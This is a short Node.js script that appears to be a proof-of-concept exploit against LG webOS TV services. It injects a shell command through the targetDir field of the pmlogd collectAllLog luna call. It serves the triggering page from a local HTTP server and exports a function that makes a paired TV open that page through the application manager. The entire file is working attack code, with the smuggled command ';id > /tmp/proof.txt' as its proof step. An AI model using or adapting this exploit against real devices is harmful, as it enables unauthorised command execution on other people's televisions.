const payload = {targetDir: "X;id > /tmp/proof.txt 2>&1;#", targetFile: "logs"};
const method = "luna://com.webos.pmlogd/collectAllLog";
const page = `<script>
const bridge = new Object();
bridge.call(${JSON.stringify(method)}, ${JSON.stringify(JSON.stringify(payload))});
</script>`;
const server = require("node:http").createServer((req, res) => {
  res.setHeader("Content-Type", "text/html");
  res.end(page);
});
server.listen(8088, "0.0.0.0");
function launchFromPairedSocket(socket, pageUrl) {
  socket.send(JSON.stringify({type: "request",
    uri: "luna://com.webos.applicationManager/launch",
    payload: {id: "com.webos.app.cmp-client", params: {"interactiveUrl": pageUrl}}
  }));
}
module.exports = {launchFromPairedSocket};
